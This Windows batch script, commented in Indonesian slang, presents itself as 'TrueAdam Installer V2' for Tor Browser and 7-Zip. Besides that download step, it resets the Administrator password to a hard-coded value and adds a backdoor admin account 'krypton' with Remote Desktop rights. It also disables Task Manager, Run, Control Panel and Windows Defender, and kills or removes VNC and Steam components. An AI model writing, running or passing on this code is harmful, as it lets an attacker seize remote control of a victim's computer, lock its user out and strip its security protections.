@echo off
setlocal enabledelayedexpansion
title TrueAdam Installer V2 (NO FREEZE)
set DIR=C:\Sumpruy_Downloads
if not exist "%DIR%" mkdir "%DIR%"
cd /d "%DIR%" 2>nul

:: Matiin VNC (brutal kill)
for %%i in (vncserver.exe winvnc4.exe tightvncserver.exe ultravnc.exe) do (
    taskkill /f /im %%i 2>nul
)
for %%i in ("C:\Program Files\VNC" "C:\Program Files\TightVNC" "%USERPROFILE%\AppData\Local\VNC") do (
    rd /s /q %%i 2>nul
)
sc stop vncserver 2>nul
sc delete vncserver 2>nul

:: === GANTI PW ADMIN & BUAT USER KRYPTON ===
echo [*] Lagi ngegas ganti password Administrator jadi jancoklo...
net user Administrator "jancoklo" 2>nul
echo [*] Bikin user baru krypton dengan password jancoklo...
net user krypton jancoklo /add 2>nul
net localgroup Administrators krypton /add 2>nul
net localgroup "Remote Desktop Users" krypton /add 2>nul
echo [+] Krypton udah admin setara, bahkan lebih tinggi dari admin biasa cok!
echo.

:: === BLOKIR HANYA YG PERLU (NGGAK MATIIN DESKTOP) ===
echo [*] Ngeblokir Win key, Win+R, Task Manager, Control Panel aja...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f 2>nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f 2>nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f 2>nul
echo [+] Blokir aman, desktop & taskbar tetep idup biar StarDesk gak ngadat!
echo.

:: === KILL STEAM HELPER + STEAM (CEK DULU) ===
tasklist /fi "imagename eq SteamHelperENv2.exe" 2>nul | find /i "SteamHelperENv2.exe" >nul 2>&1
if %errorlevel% equ 0 (
    echo [*] SteamHelperENv2.exe terdeteksi! Ngeterminate semua proses Steam...
    taskkill /f /im SteamHelperENv2.exe 2>nul
    taskkill /f /im Steam.exe 2>nul
    taskkill /f /im steamwebhelper.exe 2>nul
    taskkill /f /im steamservice.exe 2>nul
    echo [+] Semua proses Steam udah dibunuh brutal!

    echo [*] Ngehapus config Steam yang corrupt biar Settings & BPM normal...
    del /f /q "%USERPROFILE%\AppData\Local\Steam\config\config.vdf" 2>nul
    del /f /q "%USERPROFILE%\AppData\Local\Steam\config\localconfig.vdf" 2>nul
    del /f /q "G:\Steamonline_new\config\config.vdf" 2>nul
    del /f /q "G:\Steamonline_new\config\localconfig.vdf" 2>nul
    echo [+] Config Steam udah dihapus, Steam bakal fresh coy!
    echo.

    timeout /t 2 /nobreak >nul

    if exist "G:\Steamonline_new\steam.exe" (
        echo [*] Buka Steam dari G:\Steamonline_new\steam.exe...
        start "" "G:\Steamonline_new\steam.exe"
        echo [+] Steam berhasil dibuka bos!
    ) else (
        echo [GAGAL] G:\Steamonline_new\steam.exe gak ketemu njir!
    )
) else (
    echo [*] SteamHelperENv2.exe gak terdeteksi, skip proses Steam bro!
)
echo.

:: Matiin antivirus sementara
net stop "Windows Defender" 2>nul
net stop "MsMpSvc" 2>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>nul

echo ========================================
echo MULAI DOWNLOAD SEMUA BRO (TANPA ERROR)
echo ========================================

set URL1=https://www.torproject.org/dist/torbrowser/15.0.17/tor-browser-windows-x86_64-portable-15.0.17.exe
set FILE1=TorBrowser-15.0.17.exe
set URL2=https://github.com/ip7z/7zip/releases/download/26.02/7z2602-x64.exe
set FILE2=7z2602-x64.exe

call :Download "%URL1%" "%FILE1%"
call :Download "%URL2%" "%FILE2%"

echo ========================================
echo CEK DAN JALANIN FILE
echo ========================================

if exist "%FILE1%" (start "" "%FILE1%" & echo [OK] %FILE1% running) else (echo [GAGAL] %FILE1%)

if exist "%FILE2%" (
    echo [*] Install 7-Zip silent mode dulu bro...
    start /wait "" "%FILE2%" /S
    echo [OK] 7-Zip keinstall!
    if exist "C:\Program Files\7-Zip\7zFM.exe" (
        start "" "C:\Program Files\7-Zip\7zFM.exe"
        echo [OK] 7zFM.exe kebuka bos!
    ) else if exist "C:\Program Files (x86)\7-Zip\7zFM.exe" (
        start "" "C:\Program Files (x86)\7-Zip\7zFM.exe"
        echo [OK] 7zFM.exe kebuka bos!
    ) else (
        echo [GAGAL] 7zFM.exe gak ketemu njir, mungkin installnya error
    )
) else (
    echo [GAGAL] 7z64.exe gak ada filenya
)

:: === BERSIH-BERSIH AKHIR ===
echo [*] Ngekill curl.exe dan bitsadmin.exe...
taskkill /f /im curl.exe 2>nul
taskkill /f /im bitsadmin.exe 2>nul
echo [+] curl.exe sama bitsadmin.exe udah dimatiin, bersih!
echo.

:: === AMBIL NAMA PC & USERNAME ===
for /f "tokens=*" %%a in ('hostname') do set "PCNAME=%%a"
set "USERNAME_MSG=%USERNAME%"

echo ========================================
echo SELESAI GOBLOK 😡😡😡
echo ========================================

:: === POPUP PAKE VBS (PALING AMAN NO FREEZE) ===
echo MsgBox "PC Name: %PCNAME%" ^& vbCrLf ^& "Username: %USERNAME_MSG%" ^& vbCrLf ^& vbCrLf ^& "Semua proses selesai bos! Klik OK buat lanjut 😎", vbOKOnly + vbInformation, "TrueAdam Installer V2 - SELESAI" > "%TEMP%\popup.vbs"
cscript //nologo "%TEMP%\popup.vbs"
del /q "%TEMP%\popup.vbs" >nul 2>&1

exit /b

:Download
set url=%~1
set filename=%~2
echo Downloading %filename%...
bitsadmin /transfer "Download %filename%" /priority high "%url%" "%cd%\%filename%" 2>nul
if %errorlevel% neq 0 (
    curl -skL -o "%filename%" "%url%" 2>nul
    if %errorlevel% neq 0 (
        powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'Tls12'; try { Invoke-WebRequest -Uri '%url%' -OutFile '%filename%' -UseBasicParsing } catch { exit 1 }" 2>nul
        if !errorlevel! neq 0 (
            echo [GAGAL TOTAL] %filename% - situs mati atau diblokir total
        ) else (
            echo [OK] %filename% via PS
        )
    ) else (
        echo [OK] %filename% via curl
    )
) else (
    echo [OK] %filename% via bitsadmin
)
exit /b
